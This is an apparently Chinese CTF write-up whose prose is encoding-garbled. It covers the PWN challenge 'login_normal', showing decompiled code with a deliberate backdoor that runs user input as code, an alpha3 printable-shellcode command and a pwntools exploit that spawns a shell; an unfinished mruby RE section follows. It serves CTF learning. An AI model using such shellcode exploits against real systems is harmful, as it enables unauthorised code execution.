    <content type="html"><![CDATA[<p>è€ƒç ”é€‰æ‰‹æ¥æ‘¸é±¼ã€‚</p><p>ä»Šå¹´å›½èµ›èœå¾—å¾ˆå¿«ä¹ï¼Œè¶Ÿå¾—ä¹Ÿå¾ˆå¿«ä¹~</p><span id="more"></span><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>åæ§½ï¼šç›¸æ¯”äºå»å¹´å•¥éƒ½ä¸ä¼š(å½“æ—¶è¿å †éƒ½æ²¡æ¥è§¦è¿‡)ï¼Œä»Šå¹´ç»ˆäºåšå‡ºé¢˜äº†ï¼Œè™½ç„¶ä¸æ˜¯å †é¢˜ã€‚å †çš„ libc æ›´æ–°å¤ªå¿«äº†ï¼Œæˆ‘è¿ 2.27 éƒ½æ²¡ææ˜ç™½ï¼Œ2.33ã€2.34çš„å°±æ¥äº†ï¼ˆè€äººç–‘æƒ‘</p><h3 id="login-normal"><a href="#login-normal" class="headerlink" title="login_normal"></a>login_normal</h3><p>ä¿æŠ¤å…¨å¼€ã€‚è¿™é“é¢˜åˆ†æå¥½ä»£ç å°±ä¼šå†™äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x3FF</span>uLL);</span><br><span class="line">    menu(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯<code>main</code>å‡½æ•°ï¼Œå°±æ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œè¯»å…¥è¾“å…¥ï¼Œçœ‹ä¸å‡ºå•¥åå ‚ï¼Œè¿›å…¥<code>menu</code>çœ‹çœ‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">menu</span><span class="params">(_BYTE *our_input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *sa; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sb; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sc; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sd; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+17h] [rbp-39h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(qword_202040, <span class="number">0</span>, <span class="keyword">sizeof</span>(qword_202040));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  dest = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !*our_input || *our_input != <span class="number">0xA</span> &amp;&amp; (*our_input != <span class="number">13</span> || our_input[<span class="number">1</span>] != <span class="number">10</span>) )  <span class="comment">//é‡&#x27;\n&#x27;è·³å‡º</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )                              <span class="comment">// 6æ¬¡æœºä¼šread</span></span><br><span class="line">      qword_202040[<span class="number">2</span> * v8] = our_input;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(our_input, <span class="string">&#x27;:&#x27;</span>);                <span class="comment">// å¯»æ‰¾&#x27;:&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> ( !sb )                                  <span class="comment">// æ‰¾ä¸åˆ°å°±æŠ¥é”™</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="comment">//**è¿™é‡Œè¯´æ˜æˆ‘ä»¬çš„è¾“å…¥å¿…é¡»è¦åŒ…å«ä¸€ä¸ª&#x27;:&#x27;</span></span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )</span><br><span class="line">      *sc = <span class="number">0</span>;                                  <span class="comment">// ä»&#x27;:&#x27;åä¸€ä½å¯»æ‰¾å†…å®¹</span></span><br><span class="line">    <span class="keyword">if</span> ( !*sc )                                 <span class="comment">// è‹¥è¾“å…¥å†…å®¹åŒ…å«ç‰¹æ®Šå­—ç¬¦å°±æŠ¥é”™</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="comment">//**è¿™é‡Œè¯´æ˜&#x27;:&#x27;åä¸€ä½ä¸å‡†è·Ÿç‰¹æ®Šå­—ç¬¦</span></span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="number">10</span>);<span class="comment">// å¯»æ‰¾&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> ( !sd )   <span class="comment">// æ‰¾ä¸åˆ°å°±æŠ¥é”™</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;<span class="comment">//**è¿™é‡Œè¯´æ˜å†…å®¹åé¢å¿…é¡»æœ‰&#x27;\n&#x27;</span></span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    our_input = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *our_input == <span class="number">13</span> )</span><br><span class="line">      *our_input++ = <span class="number">0</span>;</span><br><span class="line">    s1 = qword_202040[<span class="number">2</span> * v8];                  <span class="comment">// s1ä¸º&#x27;:&#x27;å‰çš„å­—ç¬¦ä¸²</span></span><br><span class="line">    nptr = qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];            <span class="comment">// npträ¸º&#x27;:&#x27;åçš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(s1, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = atoi(nptr);<span class="comment">// è‹¥åœ¨æˆ‘ä»¬çš„è¾“å…¥ä¸­æ‰¾åˆ°äº†&#x27;opt&#x27;å­—ç¬¦ä¸²ï¼Œå°†å…¶è½¬ä¸ºintæ•´å‹å‚¨å­˜åœ¨v7</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( strcasecmp(s1, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, nptr, v9);<span class="comment">// è‹¥åœ¨è¾“å…¥ä¸­æ‰¾åˆ°äº†&#x27;msg&#x27;ï¼Œåˆ™å°†&#x27;:&#x27;åè¾¹çš„å†…å®¹å¤åˆ¶åˆ°desté‡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;<span class="comment">// è®¡æ•°å™¨+1ï¼Œé‡å¤ä»¥ä¸Šæ­¥éª¤</span></span><br><span class="line">  &#125;</span><br><span class="line">  *our_input = <span class="number">0</span>;</span><br><span class="line">  sa = our_input + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *sa == <span class="number">10</span> )</span><br><span class="line">    *sa = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v7 )<span class="comment">// å¯¹åº”ä»¥ä¸Šå¾ªç¯é‡Œçš„&#x27;opt&#x27;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      backdoor(dest);<span class="comment">// å¯¹åº”ä»¥ä¸Šå¾ªç¯é‡Œçš„&#x27;msg&#x27;</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_EFE(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      root(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å†æ¥çœ‹çœ‹<code>root</code>å‡½æ•°é‡Œæœ‰ä»€ä¹ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;ro0t&quot;</span>) )<span class="comment">// a1å³åœ¨menuä¸­ä¼ å…¥çš„dest</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;<span class="comment">// å°†ä¸¤ä¸ªå…¨å±€å˜é‡ç½®ä¸º1ï¼Œåœ¨backdoorå‡½æ•°é‡Œæœ‰ç”¨</span></span><br><span class="line">    unk_202024 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ¥çœ‹ä¸‹<code>backdoor</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_DA8</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )<span class="comment">// æ£€æµ‹menuä¸­ä¼ å…¥çš„destå†…å®¹æ˜¯å¦å¯æ‰“å°</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);<span class="comment">// ä¸å¯æ‰“å°å°±æŠ¥é”™</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202028 != <span class="number">1</span> )<span class="comment">//æ£€æµ‹æ˜¯å¦root</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202024 )<span class="comment">//æ£€æµ‹æ˜¯å¦root</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getpagesize();<span class="comment">// è·å–ä¸€é¡µçš„å¤§å°</span></span><br><span class="line">    dest = mmap(&amp;loc_FFE + <span class="number">2</span>, v1, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);<span class="comment">// ç”³è¯·ä¸€ç‰‡å¯è¯»å¯å†™å¯æ‰§è¡Œçš„ç©ºé—´</span></span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, v2);<span class="comment">//å°†destå†…å®¹å¤åˆ¶è‡³è¯¥ç©ºé—´</span></span><br><span class="line">    (dest)();<span class="comment">//ç›´æ¥æ‰§è¡Œdestå†…å®¹</span></span><br><span class="line"><span class="comment">// text:0000000000000EC9                 call    rdx //</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br></pre></td></tr></table></figure><p>æ€»çš„æ¥è¯´ï¼Œæ˜¯ä¸€é“ç¼–å†™å¯è§å­—ç¬¦ä¸²çš„<code>shellcode</code>é¢˜å‹ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>alpha3</code>å·¥å…·ä¾¿å¯ç”ŸæˆåŸºäº<code>rdx</code>çš„å¯æ‰“å°<code>shellcode</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/buupwn/mrctf/alpha3$ python ./ALPHA3.py x64 ascii mixedcase rdx --input=<span class="string">&quot;shellcode&quot;</span></span><br><span class="line">Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00</span><br></pre></td></tr></table></figure><p>æœ‰å¦‚ä¸‹ expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;39.105.43.168&quot;,13321)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *$rebase(0x01346)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;opt:1\nmsg:ro0tt\n\n:1&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *$rebase(0xEC9)&#x27;)</span></span><br><span class="line">io.send(<span class="string">&quot;opt:2\nmsg:&quot;</span>+shellcode+<span class="string">&quot;\n\n:2&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="baby-codeï¼ˆæœªè§£å‡º"><a href="#baby-codeï¼ˆæœªè§£å‡º" class="headerlink" title="baby_codeï¼ˆæœªè§£å‡º"></a>baby_codeï¼ˆæœªè§£å‡º</h3><p><a href="https://www.anquanke.com/post/id/253572">å…ˆæ”¾ç¯‡å¤§ä½¬çš„æ–‡ç« åœ¨è¿™é‡Œâ€”â€”mrubyå­—èŠ‚ç é€†å‘å…¥é—¨</a></p><p><a href="https://wkr.moe/ctf/787.html#Reverse">Wankko Ree ã® Blog</a></p><p><code>.mrb</code>å¯çŸ¥æ˜¯<code>mruby</code>è§£é‡Šå™¨ç”Ÿæˆçš„å­—èŠ‚ç ã€‚ä»å…¶æ–‡ä»¶å¤´å­—èŠ‚ç å¯ä»¥çœ‹å‡ºä½¿ç”¨çš„<code>mruby</code>ç‰ˆæœ¬</p><img src="https://m.360buyimg.com/babel/jfs/t1/106673/39/28401/24652/62947e45Efafd20a2/7dbea9ebee9e9003.png" style="zoom:80%;" /><p>åˆ©ç”¨<code>./mruby -v -b *.mrb  </code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span 